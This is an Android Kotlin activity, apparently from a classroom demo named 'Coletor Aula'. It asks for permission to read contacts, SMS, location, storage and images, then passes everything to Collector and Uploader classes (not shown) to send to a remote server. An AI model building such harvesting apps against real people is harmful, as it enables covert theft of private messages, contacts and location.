package com.aula.coletor

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private val PERMS = mutableListOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.READ_MEDIA_IMAGES)
    }.toTypedArray()

    private lateinit var statusText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 96, 48, 48)
        }
        val title = TextView(this).apply {
            text = "Coletor Aula\n\nToque em Permitir Tudo para iniciar a coleta."
            textSize = 18f
        }
        statusText = TextView(this).apply {
            text = ""
            textSize = 14f
            setPadding(0, 32, 0, 32)
        }
        val btn = Button(this).apply {
            text = "PERMITIR TUDO"
            setOnClickListener { requestAndCollect() }
        }
        layout.addView(title)
        layout.addView(btn)
        layout.addView(statusText)
        setContentView(layout)
    }

    private fun requestAndCollect() {
        val missing = PERMS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1)
        } else {
            startCollection()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        startCollection()
    }

    private fun startCollection() {
        statusText.text = "Coletando..."
        CoroutineScope(Dispatchers.IO).launch {
            val data = Collector.collectAll(this@MainActivity)
            val ok = Uploader.send(data)
            withContext(Dispatchers.Main) {
                statusText.text = if (ok) "Enviado com sucesso!" else "Falha no envio. Verifique a URL."
            }
        }
    }
}
